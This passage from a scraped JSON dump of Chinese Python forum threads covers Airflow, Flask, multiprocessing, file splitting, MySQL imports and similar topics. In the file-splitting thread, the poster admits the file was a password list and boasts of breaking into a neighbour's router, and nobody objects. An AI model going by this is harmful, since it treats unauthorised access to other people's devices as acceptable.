是个发往 <a href=\"https://slack.com\" rel=\"nofollow\">slack</a> 的操作，需要设置一个 slack token ，可以从<a href=\"https://api.slack.com/web\" rel=\"nofollow\">这里</a>获得，\n接着设置发往的 channel 和用户名，保持原样就好，发 slack 消息就需要刚才安装的时候装了 slackclient 。</p>\n<p>然后再看一眼发的消息<code>text</code>， airflow 执行的命令或这种消息是支持 jinja2 模板语言，\n<code>{{ ds }}</code>是一种宏，表示当前的日期，形如<code>2016-12-16</code>，支持的宏在<a href=\"https://airflow.incubator.apache.org/code.html#macros\" rel=\"nofollow\">这里</a>。</p>\n<p>最后一行就是设置依赖关系，显而易见，这是 t1 先执行， t2 在 t1 完成后执行，\n也可以用注释里的写法，但我觉得<code>&gt;&gt;</code>这样更直观，反之还有<code>&lt;&lt;</code>。\n如果有多条依赖，只需要分行写就行了，就像这样：</p>\n<pre><code>t1 &gt;&gt; t\nt3 &gt;&gt; t &lt;&lt; t2\nt &gt;&gt; w &gt;&gt; x\n</code></pre>\n<p>以上的依赖关系图就像这样：</p>\n<pre><code>t1 ---+\nt2 ---+--&gt; t ---&gt; w ---&gt; x\nt3 ---+\n</code></pre>\n<p>以上，恭喜你已经成功创建了第一个 DAG 图，下面就可以开始执行了！</p>\n<h2>命令</h2>\n<p>airflow 的所有执行操作都需要在命令行下完成，这里不得不吐槽下，界面只能看任务的依赖，\n包括任务执行状态，但如果任务失败了，还是要在命令行下执行，有些不人性化（当然你可以提个 PR ， :P ）。</p>\n<p>airflow 的命令总的来说很符合直觉，常用的有如下几个：</p>\n<ul>\n<li>test ： 用于测试特定的某个 task ，不需要依赖满足</li>\n</ul>\n<ul>\n<li>run: 用于执行特定的某个 task ，需要依赖满足</li>\n<li>backfill: 执行某个 DAG ，会自动解析依赖关系，按依赖顺序执行</li>\n<li>unpause: 将一个 DAG 启动为例行任务，默认是关的，所以编写完 DAG 文件后一定要执行这和要命令，相反命令为 pause</li>\n<li>scheduler: 这是整个 airflow 的调度程序，一般是在后台启动</li>\n<li>clear: 清除一些任务的状态，这样会让 scheduler 来执行重跑</li>\n</ul>\n<p>从上面的命令顺序也可以看出，通常我的执行顺序是这样：编写完 DAG 文件，\n直接用 backfill 命令测试整个 DAG 是否有问题，如果单个任务出错，查看 log 解决错误，\n这时可以用 test 来单独执行，如果有依赖关系就用 run 执行，都搞定了后就用 unpause 打开周期执行，\n当然 scheduler 是在后台默认打开的。之后运行过程中发现需要重跑则用 clear 命令。</p>\n<h2>一些概念</h2>\n<p>前面急于介绍 airflow 的例子，步子大有点扯着蛋，这里回过头来补充一些基础概念。</p>\n<h3>DAG (Directed Acyclic Graph)</h3>\n<p>它表示的是一些任务的集合，描述了任务之间的依赖关系，以及整个 DAG 的一些属性，\n比如起止时间，执行周期，重试策略等等。<a href=\"http://%E9%80%9A%E5%B8%B8%E4%B8%80%E4%B8%AA.py\" rel=\"nofollow\">通常一个.py</a> 文件就是一个 DAG 。\n你也可以理解为这就是一个完整的 shell 脚本，只是它可以保证脚本中的命令有序执行。</p>\n<h3>task 任务</h3>\n<p>它就是 DAG 文件中的一个个 Operator ，它描述了具体的一个操作。</p>\n<h3>Operator 执行器</h3>\n<p>airflow 定义了很多的 Operator ，通常一个操作就是一个特定的 Operator ，\n比如调用 shell 命令要用 BashOperator ，调用 python 函数要用 PythonOperator ，\n发邮件要用 EmailOperator ，连 SSH 要用 SSHOperator 。社区还在不断地贡献新的 Operator 。</p>\n<h3>ds 日期</h3>\n<p>前面的脚本里用到了<code>{{ ds }}</code>变量，每个 DAG 在执行时都会传入一个具体的时间（ datetime 对象），\n这个<code>ds</code>就会在 render 命令时被替换成对应的时间。这里要特别强调一下，\n对于周期任务， airflow 传入的时间是<strong>上一个周期</strong>的时间（划重点），比如你的任务是每天执行，\n那么今天传入的是昨天的日期，如果是周任务，那传入的是上一周今天的值。</p>\n<h3>Macros</h3>\n<p>上一条说了<code>ds</code>变量，你肯定会说我的脚本里如果需要不同的时间格式或者不同的时间段怎么办，\n这时候就到 Macro 出场了， airflow 本身提供了几种时间格式，比如<code>ds_nodash</code>，顾名思义就是不带短横<code>-</code>的时间格式，\n而且还会有一些相关的函数可以直接调用，比如<code>ds_add</code>可以对时间进行加减。</p>\n<h2>airflow 配置</h2>\n<p>前面为了尽快展示 airflow 的强大，我跳过了许多东西，比如它的配置。\n在 airflow 初始化时，它会自动在<code>AIRFLOW_HOME</code>目录下生成<code>ariflow.cfg</code>文件，现在打开它让我们看看里面的构造。</p>\n<h3>executor</h3>\n<p>这是 airflow 最关键的一个配置，它指示了 airflow 以何种方式来执行任务。它有三个选项：</p>\n<ul>\n<li>SequentialExecutor ：表示单进程顺序执行，通常只用于测试</li>\n<li>LocalExecutor ：表示多进程本地执行，它用 python 的多进程库从而达到多进程跑任务的效果。</li>\n<li>CeleryExecutor ：表示使用 celery 作为执行器，只要配置了 celery ，就可以分布式地多机跑任务，一般用于生产环境。</li>\n</ul>\n<h3>sql_alchemy_conn</h3>\n<p>这个配置让你指定 airflow 的元信息用何种方式存储，默认用 sqlite ，如果要部署到生产环境，推荐使用 mysql 。</p>\n<h3>smtp</h3>\n<p>如果你需要邮件通知或用到 EmailOperator 的话，需要配置发信的 smtp 服务器。</p>\n<h3>celery</h3>\n<p>前面所说的当使用 CeleryExecutor 时要配置 celery 的环境。</p>\n<h2>小结</h2>\n<p>忽然发现一口气写了好多，但这些解决日常的需求基本是够了，我决定先按下笔头，\n留下一些进阶姿势和线上应用实际会遇到的问题再写一篇<a href=\"\" rel=\"nofollow\">airflow 进阶</a>。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "airflow 简明指南", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然我知道在 windows 下写 python 并不友好，但是因为实际需要。。\n同样一个目录，一个是 flask 工程文件，一个是 cmdshell 下直接运行的 python 文件，用同样的方法读取文件，为何 flask 工程文件读取不到呢\nflask 工程文件代码 and 截图:<img src=\"http://p1.bqimg.com/4851/6d254474a2d0f5ae.png\">\ncmdshell 直接运行的截图:<img src=\"http://p1.bqimg.com/4851/05e5ecdf2bd6d7c5.png\"></p>\n</div></div>"], "reply": "14", "tittle": "请教一个文件读取的问题", "comment": ["权限？", "看一下路径？", " 同样都是管理员权限，同样用 cmdshell 执行 flas 工程脚本也是无法读取到，不过写文件什么的却依旧可以", " 路径是正确的，不然读不到[\"content\",\"data\",\"title\"]这个 listdir 的_(:з)∠)_", "Archiver", " 尴尬了。。。不过幸好是别人的代码，不然真的丢脸了", "请贴出代码", " \r", "flask 工程代码:\r", "\r", "import flask,os,time\r", "import shutil\r", "app = flask.Flask(__name__)\r", "PageListbuff =[]\r", "def ArichverData(id):\r", "    pass\r", "def LoadArichversList():\r", "    tempList = []\r", "    files = os.listdir(\"Arichvers\")\r", "    print files\r", "    #print files\r", "    for item in files:\r", "        titlefile = open(\"Arichvers/\"+str(item)+\"/title\",'r')\r", "        tempList.append({\"href\":WebSiteUrl+titlefile.read(),\"title\":titlefile.read(),\"Data\":ArichverData(str(item))[0]})\r", "        print os.path.isfile(\"Arichvers/\"+str(item)+\"/title\")\r", "        print os.listdir(\"Arichvers/\"+str(item))\r", "        print titlefile.read()\r", "        titlefile.close()\r", "\r", "    PageListbuff=tempList\r", ".ruote(\"/\")\r", "def index():\r", "    pass\r", "if __name__ == '__main__':\r", "    LoadArichversList()\r", "\r", "    app.run(host='0.0.0.0',port=80,threaded=True)\r", "\r", "cmdshell 下直接进入 python 执行的代码就在图中，非常短", " 我感觉是出错了 把调试打开 应该能知道是哪里错了\r", "debug=1", " 前面已经 read 过了，文件指针已经到了文件尾部，继续调用 read 当然是空的。手机上没仔细看你代码，说错勿怪。", "另外， ruote 又是什么鬼", "9bie ？", " 我也知道 read 文件指针会移动到尾部。。然而第一次读取貌似也是什么都没有。。 route 。。应该是 ruote 。。手打打太快了_(:з)∠)_。。。。", " 第一次读的文件内容保存到 tempList 里了，你把 tempList 打印出来看看"]},
{"content": ["<div class=\"topic_content\">跟同事一起写过一个 Python ，项目，他的风格是面向对象，喜欢封装成一个类，一个类里有 10 多个类变量， 30 多类方法，还有类之间嵌套：在一个类里成员变量是另外一个类实例。\r<br>我因为入门是 pascal 跟 c 这种，面向过程已经成习惯了，一般是一堆函数，外加一小部分很小的类。\r<br>大家习惯用哪种？\r<br>主流是哪种？</div>"], "reply": "36", "tittle": "在使用 Python 的时候，是面向对象多点呢还是面向过程多点？", "comment": ["如果方法之间的联系比较大，可以封装成一个类，如果关系不大的话，可以把函数封装在一个模块里面，我是这样理解的。", "只要不是为了完成一件小事，比如扫描文件类型，处理单个文本这种。都是面向对象方便的多", "面向工资最多 XD\r", "简单的工作面向过程直接处理比较多\r", "一般大型项目更倾向面向对象，以后重构要不然要改死", "我一般面向我对象多一点", "使用 Python 的时候难道不是到处都在面向对象吗 Doge", "做数据处理的，面向过程多一点。", "你一大堆函数应该也是根据一定的相关性分布到不同文件的吧，如果是这样处理的话那实际上是隐含一点面向对象的。\r", "\r", "如果管他什么函数全乱放一气，可以去死了•ᴗ•", "其实小项目没必要太纠结是否是面向对象面向过程，因为 python 是可以划分模块的，不像 php 里面只能用类的静态方法来对函数进行分类聚合。如果强行面向对象，那么也就失去了 python 这种小脚本快速开发的优势了。", "大项目的话还是面向对象比较好。", "没折腾过面向对象， 一直过程。", "面向过程，快糙猛，爽啊。\r", "\r", "面向对象感觉戴了套。", "用 Python 写程序没必要面向对象， Python 的优势就是用较少的代码量通过调用现成的库去完成任务。用 Python 去开发对象的话就失去了 Python 的优势，还不如用 Java 了", " 这回复神了", "对象一开始写的比较多, 后边方便了\r", "过程是一开始写的爽, 到后边蒙蔽了", "面向 Google", "一般上来先面向过程，快糙猛爽，后来快不行了才改成面向对象，感觉像戴了套。", "需要的时候才用 class ，保持自然", "面向 stackoverflow...", "跟自己用 C++的思路基本一致： C with classes\r", "适合什么用什么", "面向过程多，上来就干。", "不纠结，复杂了自然就用面向对象重构", "当然面向对象", " 主要看整个程序是否容易阅读和维护，找个平衡点。\r", "我之前重构过一个同事写的 C 程序，用的是函数式，功能是为了 P2P 下载的方便，把 mp4 文件流化，音、视频帧分片处理。我用 C++改成面向对象的了，结构和流程清晰了好多。", "面相代码多一点(误)", "你同事写那种，不是面向对象。", "面向过程，不是做 python 的，写的都是小程序", "代码长了就不得不面向对象了", "我入门编程后第一个正式小项目 1500 行, 刚开始做的时候没封装成类, 到后面不得不用类来表达项目结构了, 转类后清晰了很多, 拓展起来更容易, 是一个数据项目", "面向 deadline 多一点", "200 行为分界点", "分层，解耦，面向对象比较好。把有关联的方法数据封装在一起作为一个类，我觉得写起来思路清晰，长期来看写的快一点。如果是非常简单的项目，功能少，那就直接面向过程了。", "简单的时候先面向过程，然后考虑怎么面向对象。比如说有许多相同参数要传递的时候，考虑做成类的成员变量；然后该`@staticmethod`的弄成 static ；然后我写的时候尽量考虑数据是怎么变化的，多用 map/reduce/filter 会比 for-loop 更让别人清除我的意图。", "面向数据吧，数据值钱，代码不值钱", "本人非常熟悉面向对象、架构模式还有领域驱动那一套\r", "然而现在真心不喜欢这些东西\r", "几句话简单明了的事情搞一坨没用的飞机干嘛？\r", "给自己找累，也给公司招聘接手找累", "面向对象多一点\r", "\r", "面向过程在多人协同的时候，有点痛苦。", "取决你是'python hello.py' 还是'ipython In[1]: print 'hello world' '", "面向工资。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有一个文件有一百多万条数据，按行存储的。 100 多 M ，文本类型的。我想分割成小文件。每个文件 10000 行。想问下各位大神有没有解决办法。或者有代码就更好了。</p>\n</div></div>", "<div class=\"topic_content\">感谢大家。问题成功解决了。我也成功进入了邻居家的路由器管理界面。哈哈哈。\r<br>\r<br>我说的大文件实际上是一个常用密码集合。少的密码文件 有 100 多 M 。多的文件有压缩包有 1G 多。\r<br>\r<br>最后，还是感谢大家。</div>"], "reply": "24", "tittle": "Python 如何按照行来分割大文件。", "comment": ["100M 这个还需要问大神…… 老老实实地边读边写不就行了，时间都在 IO 上不在运算上， Python 绰绰有余。\r", "\r", "哦对了，最好是读写的两个文件在两块硬盘上，不然就很慢了。", "split -l", "这种事情还需要用 Python ？直接 coreutils 自带的命令 split -l 10000 就可以了。", "如果不限定 Python 的话，用 shell 一行就够了", " \r", "如果把这一百多万行数据读到内存中用 split 分成一百多万行，我担心程序会崩~~\r", "\r", " \r", " \r", " \r", "哎。关键是是 window 系统。没有 split 命令。 QAQ", " thank you  very much.", "长春儿～?", "先在本地测试", " 有", "100M 不大，全部读进内存没事的", " Python 不会全部读进内存吧……", "你为什么要全部读进内存，一行行读不行吗？", "莫不是 PHP 程序员？\r", "这么大的文件我担心程序会崩 233333\r", "\r", "用个 for 就搞定的事\r", "或者 head 配合 tail ，根本不需要 Python", "split -l 10000\r", "什么 用 Python \r", "我不知道", " msys2 （滑稽）", " \r", "\r", "php 可以用 fopen, fgets, fclose 这些函数啊。不会整个读到内存的。。。", " guess right.哈哈。", "Readline 读取至内存，然后写入不好吗", " 确实。我按照上面别人给的代码执行。任务管理器中内存看不出变化。就是 CPU 高了。\r", "\r", " 初学者，就是不知道怎么多次读才来请教的。\r", "\r", " 把文件分成块并不是最终目的。所以我需要用程序来解决。", "兄弟，学学流的概念吧，处理文件要都读内存里全世界都要疯啊", "f 。 readlines()", " 自带的行读取函数大部分时候够用，大概是类似与 .readlines 之类的函数，我估计会做惰性处理，再说哪个用户会在乎那几百 M 内存。。", "awk"]},
{"content": ["<div class=\"topic_content\">我的程序要实现的功能很简单，就是打开一个写有 1-500000 的 test.txt 的文档，数文档中奇数和偶数的个数，并写入一个字典\r<br>用多进程的方法，就是把这 500000 个数分成 n 份，每个进程处理 500000/n 个数\r<br>总之最后发现， num_of_process 越大，速度越慢，当等于 1 的时候，速度最快。这是为何？按理多进程，时间应变小。程序要做哪方面优化？\r<br>\r<br>受人之托，特来求问。惭愧了，妹子竟然写的如此一手好代码……感谢。\r<br>\r<br>from multiprocessing import pool\r<br>import time\r<br>import os\r<br>import copy\r<br>import multiprocessing\r<br>\r<br>\r<br>labels= {'0': 0, '1': 0}\r<br>train_set = 'test.txt'\r<br>num_of_process = 2\r<br>def statistics(file,label):\r<br>    num=int(file)\r<br>    if num%2==0:\r<br>       label['0']+=1\r<br>    else:\r<br>       label['1']+=1\r<br>\r<br>def union_dict(objs):\r<br>    _keys = set(sum([obj.keys() for obj in objs], []))\r<br>    _total = {}\r<br>    for _key in _keys:\r<br>        _total[_key] = sum([obj.get(_key, 0) for obj in objs])\r<br>    return _total\r<br>\r<br>def myprocess(data,i):\r<br>    labelnew=copy.deepcopy(labels)\r<br>    for afile in data[i*len(data)/num_of_process:(i+1)*len(data)/num_of_process]:\r<br>        statistics(afile, labelnew)\r<br>    return labelnew\r<br>\r<br>if __name__=='__main__':\r<br>    e1 = time.time()\r<br>    pool = multiprocessing.Pool(processes = multiprocessing.cpu_count())#processes=4 in my mac\r<br>    result_list=[]\r<br>    data_train=open(train_set,'r').readlines()\r<br>    for i in xrange(num_of_process):\r<br>        #multiprocessing.Process(myprocess(target=myprocess,args=[data_train,i]))\r<br>        result=pool.apply_async(myprocess,(data_train,i))\r<br>        result_list.append(result.get())\r<br>\r<br>    print result_list\r<br>\r<br>    pool.close()\r<br>    pool.join()\r<br>    e2 = time.time()\r<br>    print float(e2 - e1)</div>"], "reply": "18", "tittle": "求问 Python 大神，多进程处理文本内数据", "comment": ["机械硬盘随机读取需要寻道，速度远低于顺序读取。所以你进程分得越多越慢。\r", "\r", "话说现在的程序员都不知道硬盘 IO 是大部分程序的瓶颈了吗？", "。。。抱歉没看你的程序就回复了。你的程序的问题不在于读写，大概在于进程间数据的拷贝。你的 data_train 在 pool 建立之后才读取的，目测数据要拷贝到子进程里面。\r", "\r", "如果是 *nix ，你可以试试把读取数据放到 pool 创建之前，也许有效。实在不行你用 os.fork 。", "话说最后吐槽一句：你都把文件整个读到内存里面了还分进程个屁啊，统计奇数和偶数明明是 O(n) 的算法，你读取文件也是 O(n) 的操作，干嘛不一个进程直接边读边统计，还要 readlines 读到内存里面做啥。\r", "\r", "如果你想要每个进程分别读取部分数据（一开始我看你的题目就是这么猜想的，所以直接回答了一楼），那就会遇到机械硬盘的瓶颈，还是没有意义。\r", "\r", "所以结论就是，你这例子根本什么意义都没有，就算进程越多越慢也不能说明任何问题。", "建议可以这样玩：\r", "1.探测当前系统 CPU 核心数 m ，\r", "2.将文件切分成 m 份存硬盘上，根据 m 份文件名生成任务列表，\r", "3.根据任务 /文件名列表创建最大进程数为 j=m 或者 j= m+2 的多进程池\r", "4.进程池发动任务，呼叫任务进程执行（每进程的结果写入独立某 db/某文件)，记得一定得丢到后台去跑\r", "4.1 任务进程先检查当前系统里是否正在执行的任务进程 =j or > j (避免超载)，若有空闲，则立即执行，否则等待 0.1 秒，循环检查\r", "5.任务进程结束，汇总结果数据\r", "#3 ( j 得实际测试，根据之前玩 freebsd / gentoo 时，编译软件包 编译器推荐使用 cpu 核数 +2 的并行进程数; 但去年按以上思路作过某实用小应用，实际却是在 4 核机器上最大并行开 40 个任务是刚能榨干算力)", "  \"num_of_process 越大，速度越慢，当等于 1 的时候，速度最快\"  很怀疑这个运行环境是单核心 /CPU", "日志统计的瓶颈一般都在 io ，多进程没有用", "看了一下，估计是因为数据总量太小，所以分解的成本超过了带来的收益", " 赞同, 50w 数据, 一个进程都不够吃的", "这种 IO 瓶颈的加 CPU 也没用啊", "妹子竟然写的如此一手好代码， no picture you say a egg", "an", "现成的 spark 能干的事情为啥还要自己造轮子？", "python 的解释器还是有全局锁的 ", " ，所以 python 的多线程效率一直不怎么样", " 不要赖全局锁好不好，明明她用的是多进程。。\r", "最费时的 IO 操作在进程分支之前已经做了，而每个 worker 进程需要的运算又很少，就一个 M 个判断，所以时间主要都拿去做进程空间拷贝，数据拷贝之类的工作了。\r", "\r", "让妹子注册个账号好沟通一点哦 ： p", "你这个不是磁盘 io 问题啊。\r", "首先，你只打开了一次文件，所以这个耗时应该是一个定值。\r", "然后你要的结果是统计，所以你需要把数据分成均等的几份，交给多进程处理，这个也没有问题。\r", "多进程处理的结果，你放到一个 dict 中。这样相当于多个进程修改一个数据，必然会越处理越慢啊。因为一个修改的时候，另外一个必须等待，所以问题在这里。", "和楼上说的一样，分布式情境下推荐用 spark 吧", " 正解", "感谢各位，朋友说换至单位 32 核服务器运行单位项目，速度有明显改善。\r", "我猜测大致如 ipwx 和 appleorchard2000 等朋友们解说，数据总量太小，所以分解的成本超过了带来的收益。\r", "再谢感谢大家。祝大家 2017 一切顺利。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>嗯，今天本来想好好学习别人的代码的，突然看到 requests 模块，想想貌似这模块很常用的说，我竟然没用过，于是我就找了下文档看了下，嗯，光看不练是不对的，然后我就想做点什么，突然想到我每次写 hexo blog 的时候，每次要把图片截取保存到本地，然后上传到我的图床，然后拷贝链接， OMG 好烦啊，于是发现这篇<a href=\"https://chevereto.com/docs/api-v1\" rel=\"nofollow\">文档</a> ， 是时候造个轮子了。</p>\n<p>下面是代码</p>\n<pre><code>#coding=utf-8\nimport requests\nimport json\nimport mimetypes\nfrom PIL import ImageGrab\nimport datetime\n\ndef upload(files):\n    APIKey = \"YOUR API KEY\"\n    format = \"json\"\n    url = \"http://domain.com/api/1/upload/?key=\"+ APIKey + \"&amp;format=\" + format\n    #files = \n    r = requests.post(url , files = files)\n\n    return json.loads(r.text)\n\ndef formatSource(filename):\n    imageList = []\n    type = mimetypes.guess_type(filename)[0]\n    imageList.append(('source' , (filename , open(filename , 'rb') , type)))\n    print imageList\n    return imageList\n\nif __name__ == \"__main__\":\n    print \"将图片截图或复制到剪切板中即可~~， ctrl+z 结束\"\n    recentVal = None\n    while(True):\n        tmpValue = ImageGrab.grabclipboard()\n        if recentVal != tmpValue:\n            recentVal = tmpValue\n            now = datetime.datetime.now()\n            now = now.strftime(\"%Y-%m-%d %H:%M:%S\")\n            filename = 'IMG'+ now + '.png'\n            if recentVal is not None:\n                recentVal.save(filename, 'png')\n                #filenames.append(filename)\n                #recentVal = None\n                print filename\n                jsonData = upload(formatSource(filename))\n\n                if jsonData['status_code'] != 200:\n                    print \"error: \" , jsonData['error']['message']\n                    print \"status code : \" , jsonData['status_code']\n                else:\n                    print \"orignal url: \" , jsonData['image']['display_url']\n                    print \"thumb url: \" , jsonData['image']['thumb']['url']\n</code></pre>\n<h1>运行示例</h1>\n<p><img alt=\"示例\" src=\"https://ww2.sinaimg.cn/large/006tKfTcgw1fbcfkytzffg30uy0lu1kx.gif\"></p>\n<p>有点慢啊，因为我的服务器在国外~~</p>\n<h1>使用方法</h1>\n<p>将你的 chevereto 的 API key 拷贝到对应位置，替换 <a href=\"http://domain.com\" rel=\"nofollow\">domain.com</a> 为你自己的域名，嗯，就这样，这只是练习代码，难免有些 bug ，你懂得</p>\n<p>其实讲道理用curl就可以弄的，但是我不会把本地的图片传到服务器上，据说要base64编码~~~sad</p>\n<p>嗯，开年第一个轮子,大家新年快乐！</p>\n</div></div>"], "reply": "9", "tittle": "用 chevereto 图床的小伙伴快进来，有福利~", "comment": ["可以加上 sm.ms 图床嘛 嘻嘻", "挺有意思的，赞一个", "等我有了图床", "  \r", "\r", "```py\r", "#coding=utf-8\r", "import requests\r", "import json\r", "import mimetypes\r", "from PIL import ImageGrab\r", "import datetime\r", "\r", "def upload(files):\r", "    APIKey = \"YOUR API KEY\"\r", "    format = \"json\"\r", "    #url = \"http://domain.com/api/1/upload/?key=\"+ APIKey + \"&format=\" + format\r", "    url = \"https://sm.ms/api/upload?ssl=False&format=json\"\r", "    #files = \r", "    r = requests.post(url , files = files)\r", "\r", "    return json.loads(r.text)\r", "\r", "def formatSource(filename):\r", "    imageList = []\r", "    type = mimetypes.guess_type(filename)[0]\r", "    imageList.append(('smfile' , (filename , open(filename , 'rb') , type)))\r", "    print imageList\r", "    return imageList\r", "\r", "if __name__ == \"__main__\":\r", "    print \"将图片截图或复制到剪切板中即可~~， ctrl+z 结束\"\r", "    recentVal = None\r", "    while(True):\r", "        tmpValue = ImageGrab.grabclipboard()\r", "        if recentVal != tmpValue:\r", "            recentVal = tmpValue\r", "            now = datetime.datetime.now()\r", "            now = now.strftime(\"%Y-%m-%d %H:%M:%S\")\r", "            filename = 'IMG'+ now + '.png'\r", "            if recentVal is not None:\r", "                recentVal.save(filename, 'png')\r", "                #filenames.append(filename)\r", "                #recentVal = None\r", "                print filename\r", "                jsonData = upload(formatSource(filename))\r", "\r", "                if jsonData['code'] != \"success\":\r", "                    print \"error: \" , jsonData['msg']\r", "                    print \"status code : \" , jsonData['code']\r", "                else:\r", "                    print \"url: \" , jsonData['data']['url']\r", "                    #print \"orignal url: \" , jsonData['image']['display_url']\r", "                    #print \"thumb url: \" , jsonData['image']['thumb']['url']\r", "```\r", "\r", "临时改了改，亲测可以用", "回复不支持 markdown 吗。。。。", "  ", "  放 gist 里了", " 666", "好东西，研究下", " nice"]},
{"content": ["<div class=\"topic_content\">网上找了很久 12 期的视频，都是加密的。只能买了，有人一起想学 python 么？合购能便宜点，愿意合购的可以加我 QQ 575942950</div>"], "reply": "1", "tittle": "有人一起合购老男孩 python12 期的么？", "comment": ["电脑上看看这个页面右边的推荐书目比较好哦，好过看视频。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>背景</h1>\n<p>aredis 是一款由 <a href=\"https://github.com/andymccurdy/redis-py\" rel=\"nofollow\">redis-py</a> 改写而成的 Python redis 客户端</p>\n<h1>改动</h1>\n<p>主要重写了底部建立连接和读取数据部分的代码，对于接口部分除了 iter 相关的代码暂时不可用以外都向下兼容，便于使用者从 redis-py 的同步代码迁移到 async 和 await 的协程版本（ Python 3.5 中不支持在 <code>async</code> 定义的函数下使用 <code>yield</code>, Python 3.6 可以，后续会加上）</p>\n<h1>优势</h1>\n<p>相比于现有的两款支持 <code>async/await</code> 的 redis 客户端来说：</p>\n<p><a href=\"https://github.com/aio-libs/aioredis\" rel=\"nofollow\">aioredis</a> 要求装上 hiredis ， aredis 可以不需要相关依赖地运行，速度上两者持平且都可以使用 hiredis 来作为 parser ，用 uvloop 代替 asyncio 的 eventloop 来加速</p>\n<p><a href=\"https://github.com/jonathanslenders/asyncio-redis\" rel=\"nofollow\">asyncio_redis</a> aredis 速度上领先于 asyncio_redis</p>\n<h1>劣势</h1>\n<p>现在对于编码的支持还不是那么完善，大部分命令还是用 bytes 类型作为返回值，且目前只支持 Python 3.5 及以上的版本</p>\n<h6>前排求 star 和 pr</h6>\n</div></div>", "<div class=\"topic_content\">第一次发推广贴，有点紧张了，连项目地址都没贴 orz\r<br>项目地址： <a target=\"_blank\" href=\"https://github.com/NoneGG/aredis\" rel=\"nofollow\">https://github.com/NoneGG/aredis</a></div>"], "reply": "3", "tittle": "[python] aredis —— 一款 redis 的异步客户端", "comment": ["貌似有点歧义，是相对于 asyncio_redis 来说速度上领先", "项目地址 ", "第一次发这种推广贴，有点紧张了 orz"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>get 下来的内容，有 t_con 的字符的\n但是呢？经过 BeautifulSoup 处理后，却没有了 t_con 的字符，这是怎么回事呢？</p>\n<pre><code>\n# -*- coding: utf-8 -*-\n\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef get_info_from(url):\n    headers = {\n        \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\"\n    }\n\n    web_data = requests.get(url, headers=headers)\n    web_data.encoding = 'utf-8'\n    # print(web_data.text)    # 输出的结果中，搜索 t_con ，可以搜到\n\n    soup = BeautifulSoup(web_data.text, 'lxml')\n    # print(soup)     # 输出的结果中，搜索 t_con, 搜不到了，为什么经过处理后却搜索不到了呢？\n\nif __name__ == \"__main__\":\n    test_url = \"http://tieba.baidu.com/f?kw=%E4%B8%BA%E7%9F%A5%E7%AC%94%E8%AE%B0&amp;ie=utf-8&amp;pn=0\"\n    get_info_from(test_url)\n\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "爬虫遇到的一点问题： BeautifulSoup 处理后的内容发生了变化", "comment": ["lxml 改成 html5lib 试一下", " 用 html5lib 可以，但是为什么呢？", "解析器对非标准的 html 格式的解析结果不一样， lxml 会忽略掉不符合规则的标签， html5lib 会自动补全不正确的", " 十分感谢！一直用 BeautifulSoup+lxml ，现在发现有些网页解析不好，而且 find_all 还找不出东西。这个时候是不是该换正则了", " 如果对正则很熟的话绝对换正则啊， beautifulsoup 和 xpath 只是比较方便，复杂的要求就懵逼了", " thanks ！:)", " 学习了"]},
{"content": ["<div class=\"topic_content\">已解决，刚请教了一位。\r<br>一行代码搞定\r<br>\r<br>copy *.csv  sum.csv</div>"], "reply": "8", "tittle": "有没有好的方法导入 5000 多个 csv 文件到 mysql 呢", "comment": ["写个脚本跑一下吧，或者 excle 有宏，直接把 5000csv 合并", "\r", "\r", "DataX 可以实现 csv 到 mysql 的快速导入。", "我一般是这么弄的\r", "\r", "for i in ./*; do cat $i | tail +n 2 | tr -d '\"' | awk -F ',' '{insert into xxx values....}'>>/tmp/final.sql ; done", "for LOG in *.csv; do\r", "\r", "echo \"LOAD DATA LOCAL INFILE '$LOG' INTO TABLE `tbl_xxxx` FIELDS TERMINATED BY ',' (fld_xxx, fld_xxx);\" | mysql -u$MYSQL_USR $MYSQL_DB;\r", "\r", "done", "试试 mysql 的 load data infile", "mysql 不是有 csv 引擎吗？不是能直接打开吗？", "  这工具不错.", "将 csv 打开为 excel\r", "在 excel 中使用函数将列拼接成 sql"]},
{"content": ["<div class=\"topic_content\">Flask 新人一枚，之前一直在学习 android ，然后就看到所有的 api store 当要用他们提供的 api 的时候都要求带一个 kei 进行访问，而且还有请求次数，想知道要怎么实现，或者是怎么个流程，希望大大们告知一下，谢谢</div>"], "reply": "7", "tittle": "关于像各种 api store 里需要一个 key 才能对 api 进行访问是如何实现的？", "comment": ["1. 生成指定 api 可用的 key ，并设置可用次数\r", "2. 收到请求时检查 key 是否可用，次数是否足够", "有很多 api gateway 的工具可以使用，后台自己的 api 不需要加认证鉴权 cache 等功能，依赖工具封装，也可以做 api 调用频次限制能功能。例如 amazon api gateway 或者 Kong ", "OAuth 2.0", " Kong 这个很棒 nice", " \r", " \r", " \r", "感谢大家提供的思路和解决办法，我这里看了下 Kong 和我的需求很吻合", " 似乎并不是指定 api 而是用户全局 api", "这就是一个验证用的 token 啊,flask 的话放在 before_request 里，每次请求验证 token,一般情况下一个 token 代表的就是一个用户，可以根据 token 获取对应的用户信息,验证失败则 api 不能访问"]},
{"content": ["<div class=\"topic_content\">看过了 as_view()的源码，还是不是太明白这个函数后面的 update_wrapper 怎样去使得视图运行然后生产 HttpResponse ，有大神懂的话求科普，刚刚上手框架的小白求答案</div>"], "reply": "2", "tittle": "django 中视图.as_view 函数求详解", "comment": ["在这里贴上源码，方便大神来教导\r", "def as_view(cls, **initkwargs):\r", "        \"\"\"\r", "        Main entry point for a request-response process.\r", "        \"\"\"\r", "        for key in initkwargs:\r", "            if key in cls.http_method_names:\r", "                raise TypeError(\"You tried to pass in the %s method name as a \"\r", "                                \"keyword argument to %s(). Don't do that.\"\r", "                                % (key, cls.__name__))\r", "            if not hasattr(cls, key):\r", "                raise TypeError(\"%s() received an invalid keyword %r. as_view \"\r", "                                \"only accepts arguments that are already \"\r", "                                \"attributes of the class.\" % (cls.__name__, key))\r", "\r", "        def view(request, *args, **kwargs):\r", "            self = cls(**initkwargs)\r", "            if hasattr(self, 'get') and not hasattr(self, 'head'):\r", "                self.head = self.get\r", "            self.request = request\r", "            self.args = 